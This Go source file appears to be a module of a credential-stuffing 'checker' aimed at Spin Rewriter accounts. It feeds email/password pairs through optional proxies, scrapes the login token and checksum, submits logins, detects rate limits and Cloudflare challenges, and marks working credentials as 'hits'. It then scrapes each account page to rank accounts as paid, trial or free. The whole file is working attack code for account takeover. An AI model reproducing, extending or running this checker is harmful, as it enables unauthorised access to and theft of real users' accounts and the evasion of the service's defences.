package main

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
)

var (
	srLoginTokenRE   = regexp.MustCompile(`(?i)name=["']login_token["'][^>]*value=["']([^"']+)["']`)
	srLoginTokenRE2  = regexp.MustCompile(`(?i)id=["']login_token["'][^>]*value=["']([^"']+)["']`)
	srChecksumRE     = regexp.MustCompile(`(?i)name=["']checksum["'][^>]*value=["']([^"']+)["']`)
	srChecksumRE2    = regexp.MustCompile(`(?i)id=["']checksum["'][^>]*value=["']([^"']+)["']`)
	srLoginErrorRE   = regexp.MustCompile(`(?is)class=["'][^"']*alert--error[^"']*["'][^>]*>.*?alert__content[^>]*>(.*?)</div>`)
	srPaidPlanNameRE = regexp.MustCompile(`(?i)Spin Rewriter\s*[-–]\s*(Monthly|Yearly|Lifetime|Gold|WordPress)`)
	srBillingPriceRE = regexp.MustCompile(`(?i)\$\s*[\d,]+(?:\.\d{2})?\s*per\s+(month|year)`)
)

func (c *Checker) checkSpinrewriter(email, password string, proxyURL *url.URL) CheckResult {
	result := CheckResult{Email: email, Password: password}

	client, err := c.freshClient(proxyURL)
	if err != nil {
		result.Status = StatusError
		result.Reason = err.Error()
		return result
	}
	sessionOpen := false
	defer deferAmemberSession(client, c, &sessionOpen, c.cfg.BaseURL(), "https://www.spinrewriter.com")()

	loginURL := c.cfg.LoginURL()
	loginPostURL := c.cfg.Var("login_post_url", c.cfg.BaseURL()+"/action/log-in")
	accountURL := c.cfg.Var("account_url", c.cfg.BaseURL()+"/cp-account")

	loginBody, loginStatus, err := c.fetchURL(client, loginURL, c.spinrewriterPageHeaders(""))
	if err != nil {
		status, reason := c.resultFromRequestErr("login page", err)
		result.Status = status
		result.Reason = reason
		return result
	}
	if loginStatus == http.StatusTooManyRequests {
		result.Status = StatusRateLimited
		result.Reason = rateLimitReason("login page HTTP 429")
		return result
	}
	if loginStatus != http.StatusOK {
		result.Status = StatusError
		result.Reason = fmt.Sprintf("login page HTTP %d", loginStatus)
		return result
	}
	if noxtoolsIsCloudflareChallenge(loginBody) {
		result.Status = StatusError
		result.Reason = "Cloudflare challenge on login page — try proxy or wait"
		return result
	}

	loginToken, checksum, err := parseSpinrewriterLoginFields(loginBody)
	if err != nil {
		result.Status = StatusError
		result.Reason = err.Error()
		return result
	}

	finalURL, postBody, postStatus, err := c.postSpinrewriterLogin(client, loginPostURL, email, password, loginToken, checksum)
	if err != nil {
		status, reason := c.resultFromRequestErr("login POST", err)
		result.Status = status
		result.Reason = reason
		return result
	}
	if postStatus == http.StatusTooManyRequests {
		result.Status = StatusRateLimited
		result.Reason = rateLimitReason("login POST HTTP 429")
		return result
	}

	if msg := parseSpinrewriterLoginError(postBody); msg != "" {
		lower := strings.ToLower(msg)
		if strings.Contains(lower, "wait") || strings.Contains(lower, "try again later") || strings.Contains(lower, "too many") {
			result.Status = StatusRateLimited
			result.Reason = msg
			return result
		}
		result.Status = StatusFail
		result.Reason = msg
		return result
	}

	if !spinrewriterLoginSucceeded(finalURL, postBody) {
		result.Status = StatusFail
		result.Reason = "login failed — invalid email or password"
		return result
	}
	sessionOpen = true

	result.AccountEmail = email
	planInfo := c.fetchSpinrewriterPlanInfo(client, accountURL, postBody)
	result.PlanName = planInfo.Name
	result.PlanLabel = planInfo.Label
	result.Status = StatusHit
	return result
}

func (c *Checker) spinrewriterPageHeaders(referer string) map[string]string {
	h := map[string]string{
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language": "en-US,en;q=0.9",
		"Cache-Control":   "no-cache, no-store",
		"Pragma":          "no-cache",
		"User-Agent":      c.cfg.UserAgent,
	}
	if referer != "" {
		h["Referer"] = referer
	}
	return h
}

func parseSpinrewriterLoginFields(body string) (loginToken, checksum string, err error) {
	for _, re := range []*regexp.Regexp{srLoginTokenRE, srLoginTokenRE2} {
		if m := re.FindStringSubmatch(body); len(m) >= 2 && strings.TrimSpace(m[1]) != "" {
			loginToken = strings.TrimSpace(m[1])
			break
		}
	}
	if loginToken == "" {
		return "", "", fmt.Errorf("missing login_token on login page")
	}
	for _, re := range []*regexp.Regexp{srChecksumRE, srChecksumRE2} {
		if m := re.FindStringSubmatch(body); len(m) >= 2 && strings.TrimSpace(m[1]) != "" {
			checksum = strings.TrimSpace(m[1])
			break
		}
	}
	if checksum == "" {
		return "", "", fmt.Errorf("missing checksum on login page")
	}
	return loginToken, checksum, nil
}

func (c *Checker) postSpinrewriterLogin(client *http.Client, loginPostURL, email, password, loginToken, checksum string) (finalURL, body string, status int, err error) {
	form := url.Values{}
	form.Set("email", email)
	form.Set("password", password)
	form.Set("login_token", loginToken)
	form.Set("checksum", checksum)
	form.Set("return_path", "")
	form.Set("browser_timezone", "America/New_York")
	form.Set("submit", "1")

	req, err := http.NewRequest(http.MethodPost, loginPostURL, strings.NewReader(form.Encode()))
	if err != nil {
		return "", "", 0, err
	}
	headers := c.spinrewriterPageHeaders(c.cfg.LoginURL())
	headers["Content-Type"] = "application/x-www-form-urlencoded"
	headers["Origin"] = c.cfg.BaseURL()
	for k, v := range headers {
		req.Header.Set(k, v)
	}

	resp, err := client.Do(req)
	if err != nil {
		return "", "", 0, err
	}
	defer resp.Body.Close()

	data, err := io.ReadAll(io.LimitReader(resp.Body, 4<<20))
	if err != nil {
		return resp.Request.URL.String(), "", resp.StatusCode, err
	}
	return resp.Request.URL.String(), string(data), resp.StatusCode, nil
}

func parseSpinrewriterLoginError(body string) string {
	lower := strings.ToLower(body)
	if strings.Contains(lower, "invalid email or password") {
		return "Invalid email or password."
	}
	if m := srLoginErrorRE.FindStringSubmatch(body); len(m) >= 2 {
		msg := strings.TrimSpace(stripHTMLTags(m[1]))
		if msg != "" {
			return msg
		}
	}
	return ""
}

func spinrewriterLoginSucceeded(finalURL, body string) bool {
	if parseSpinrewriterLoginError(body) != "" {
		return false
	}
	if isSpinrewriterLoginPage(body) {
		return false
	}
	u := strings.ToLower(finalURL)
	for _, path := range []string{"/cp-account", "/cp-home", "/cp-rewrite", "/cp-api", "/cp-affiliate", "/cp-support"} {
		if strings.Contains(u, path) {
			return true
		}
	}
	if !strings.Contains(u, "/log-in") && !strings.Contains(u, "/login") {
		return true
	}
	return false
}

func isSpinrewriterLoginPage(body string) bool {
	lower := strings.ToLower(body)
	if !strings.Contains(lower, `id="container-log-in"`) && !strings.Contains(lower, `entry--login`) {
		return false
	}
	return strings.Contains(lower, `name="login_token"`) || strings.Contains(lower, `heading-log-in`)
}

type spinrewriterPlanInfo struct {
	Name  string
	Label string
}

func (c *Checker) fetchSpinrewriterPlanInfo(client *http.Client, accountURL, loginBody string) spinrewriterPlanInfo {
	if info := parseSpinrewriterAccountPage(loginBody); info.Label != "" && info.Label != "UNKNOWN" {
		if info.Label != "FREE" || !strings.Contains(strings.ToLower(loginBody), "/cp-account") {
			if isSpinrewriterAccountPage(loginBody) {
				return info
			}
		}
	}

	body, status, err := c.fetchURL(client, accountURL, c.spinrewriterPageHeaders(c.cfg.BaseURL()+"/cp-home"))
	if err != nil || status != http.StatusOK {
		if info := parseSpinrewriterAccountPage(loginBody); info.Label != "" {
			return info
		}
		return spinrewriterPlanInfo{Name: "Registered (No Active Plan)", Label: "FREE"}
	}
	if isSpinrewriterLoginPage(body) {
		return spinrewriterPlanInfo{Name: "Registered (No Active Plan)", Label: "FREE"}
	}
	return parseSpinrewriterAccountPage(body)
}

func isSpinrewriterAccountPage(body string) bool {
	lower := strings.ToLower(body)
	return strings.Contains(lower, "cp-account") ||
		strings.Contains(lower, "my account") ||
		strings.Contains(body, "click_cancel_braintree_subscription") ||
		strings.Contains(body, "click_cancel_paddle_subscription") ||
		strings.Contains(body, "paddle_button_js")
}

func parseSpinrewriterAccountPage(body string) spinrewriterPlanInfo {
	lower := strings.ToLower(body)

	if strings.Contains(lower, "free trial") {
		for _, marker := range []string{
			"days left",
			"trial ends",
			"trial period",
			"cancel your free trial",
			"click_cancel",
		} {
			if strings.Contains(lower, marker) {
				name := "Free Trial"
				if m := srPaidPlanNameRE.FindStringSubmatch(body); len(m) >= 2 {
					name = "Free Trial — Spin Rewriter " + strings.TrimSpace(m[1])
				}
				return spinrewriterPlanInfo{Name: name, Label: "FREE_TRIAL"}
			}
		}
	}

	if strings.Contains(body, "click_cancel_braintree_subscription") ||
		strings.Contains(body, "click_cancel_paddle_subscription") {
		return spinrewriterPlanInfo{
			Name:  extractSpinrewriterPaidPlanName(body),
			Label: "PAID",
		}
	}

	for _, marker := range []string{
		"next payment",
		"subscription renews",
		"auto-renew",
		"billing date",
		"you already have active access",
		"ready_active_account",
	} {
		if strings.Contains(lower, marker) {
			return spinrewriterPlanInfo{
				Name:  extractSpinrewriterPaidPlanName(body),
				Label: "PAID",
			}
		}
	}

	if m := srPaidPlanNameRE.FindStringSubmatch(body); len(m) >= 2 {
		if !spinrewriterLooksLikePricingGrid(body) {
			return spinrewriterPlanInfo{
				Name:  "Spin Rewriter - " + strings.TrimSpace(m[1]),
				Label: "PAID",
			}
		}
	}

	if m := srBillingPriceRE.FindStringSubmatch(body); len(m) >= 2 {
		if !spinrewriterLooksLikePricingGrid(body) {
			return spinrewriterPlanInfo{
				Name:  "Active Subscription (" + strings.TrimSpace(m[0]) + ")",
				Label: "PAID",
			}
		}
	}

	if strings.Contains(body, "paddle_button_js") ||
		strings.Contains(lower, "get monthly access") ||
		strings.Contains(lower, "get yearly access") ||
		strings.Contains(lower, "get lifetime access") ||
		spinrewriterLooksLikePricingGrid(body) {
		return spinrewriterPlanInfo{Name: "Free Account (No Subscription)", Label: "FREE"}
	}

	return spinrewriterPlanInfo{Name: "Registered (No Active Plan)", Label: "FREE"}
}

func spinrewriterLooksLikePricingGrid(body string) bool {
	lower := strings.ToLower(body)
	count := 0
	for _, marker := range []string{"get monthly access", "get yearly access", "get lifetime access", "pricing__item"} {
		if strings.Contains(lower, marker) {
			count++
		}
	}
	return count >= 2 || (strings.Contains(body, "paddle_button_js") && strings.Contains(lower, "pricing__item"))
}

func extractSpinrewriterPaidPlanName(body string) string {
	if m := srPaidPlanNameRE.FindStringSubmatch(body); len(m) >= 2 {
		return "Spin Rewriter - " + strings.TrimSpace(m[1])
	}
	if m := srBillingPriceRE.FindStringSubmatch(body); len(m) >= 2 {
		return "Active Subscription (" + strings.TrimSpace(m[0]) + ")"
	}
	return "Active Paid Subscription"
}

func stripHTMLTags(s string) string {
	s = regexp.MustCompile(`(?s)<[^>]+>`).ReplaceAllString(s, " ")
	return strings.Join(strings.Fields(s), " ")
}
